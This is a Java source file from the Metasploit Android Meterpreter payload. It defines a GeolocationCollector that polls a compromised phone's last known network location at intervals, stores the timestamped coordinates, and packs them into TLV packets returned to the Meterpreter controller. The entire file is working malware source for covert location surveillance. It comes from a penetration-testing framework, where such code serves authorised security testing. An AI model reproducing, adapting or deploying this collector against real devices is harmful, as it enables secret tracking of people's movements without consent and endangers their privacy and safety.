package com.metasploit.meterpreter;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;

import com.metasploit.meterpreter.android.android_interval_collect;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Hashtable;
import java.util.List;

public class GeolocationCollector extends IntervalCollector  {

    private final Object syncObject = new Object();
    protected LocationManager mLocationManager;
    public Location mLocationObj;
    private Hashtable<Long, GeoModel> collections = null;

    private class GeoModel {

        public long mTimestamp;
        public double mLatitude, mLongitude;

        public void setLocation(Location location ){
            mTimestamp = System.currentTimeMillis();
            if (location != null) {
              mLatitude = location.getLatitude();
              mLongitude = location.getLongitude();
            } else {
              mLatitude = 0;
              mLongitude = 0;
            }
        }

        public void write(DataOutputStream output) throws IOException {
            output.writeLong(this.mTimestamp);
            output.writeDouble(mLatitude);
            output.writeDouble(mLongitude);
        }

        public void read(DataInputStream input) throws IOException {
            mTimestamp = input.readLong();
            mLatitude = input.readDouble();
            mLongitude = input.readDouble();
        }
    }

    public GeolocationCollector(int collectorId, Context context, long timeout) {
        super(collectorId, context, timeout);
        this.collections = new Hashtable<Long, GeoModel>();
        mLocationManager = (LocationManager) AndroidMeterpreter.getContext()
          .getSystemService(Context.LOCATION_SERVICE);
    }

    public GeolocationCollector(int collectorId, Context context) {
        super(collectorId, context);
        this.collections = new Hashtable<Long, GeoModel>();
        mLocationManager = (LocationManager) AndroidMeterpreter.getContext().getSystemService(Context.LOCATION_SERVICE);
    }

    protected void init() { }

    protected void deinit() { }

    protected boolean collect(DataOutputStream output) throws IOException {

        Location location = mLocationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        GeoModel lGeoMod = new GeoModel();

        lGeoMod.setLocation(location);

        synchronized (this.syncObject) {
            this.collections.put(System.currentTimeMillis(), lGeoMod);

            // serialize and write to storage, formatted as:
            // Long( configured polling frequency [ timeout ] )
            // Long( number of snapshots taken )
            //    -> Long( timestamp )
            //    -> Double( latitude )
            //    -> Double( longitude )

            output.writeLong(this.timeout);
            output.writeInt(this.collections.size());
            for (Long ts : this.collections.keySet()) {
                GeoModel lGeoModObj;
                lGeoModObj = this.collections.get(ts.longValue());
                lGeoModObj.write(output);
            }
        }

        return true;
    }

    protected void loadFromMemory(DataInputStream input) throws IOException {
        this.timeout = input.readLong();
        int collectionCount = input.readInt();
        for (int i = 0; i < collectionCount; ++i) {
            GeoModel lGeoModObj = new GeoModel();
            lGeoModObj.read(input);
            this.collections.put(lGeoModObj.mTimestamp, lGeoModObj);
        }
    }

    public boolean flush(TLVPacket packet) {
        Hashtable<Long, GeoModel> collections = this.collections;
        synchronized (this.syncObject) {
            // create a new collection, for use on the other thread if it's running
            this.collections = new Hashtable<Long, GeoModel>();
        }

        List<Long> sortedKeys = new ArrayList<Long>(collections.keySet());
        Collections.sort(sortedKeys);

        try {
            for (Long ts : sortedKeys) {

                long timestamp = ts.longValue();
                GeoModel geoLoc = collections.get(timestamp);
                TLVPacket resultSet = new TLVPacket();
                TLVPacket geolocationSet = new TLVPacket();

                resultSet.add(android_interval_collect.TLV_TYPE_COLLECT_RESULT_TIMESTAMP, timestamp / 1000);

                geolocationSet.add(android_interval_collect.TLV_TYPE_GEO_LAT, Double.toString(geoLoc.mLatitude));
                geolocationSet.add(android_interval_collect.TLV_TYPE_GEO_LONG, Double.toString(geoLoc.mLongitude));
                resultSet.addOverflow(android_interval_collect.TLV_TYPE_COLLECT_RESULT_GEO, geolocationSet);

                packet.addOverflow(android_interval_collect.TLV_TYPE_COLLECT_RESULT_GROUP, resultSet);
            }
        }
        catch (IOException ex) {
            // not good, but not much we can do here
        }

        return true;
    }
}

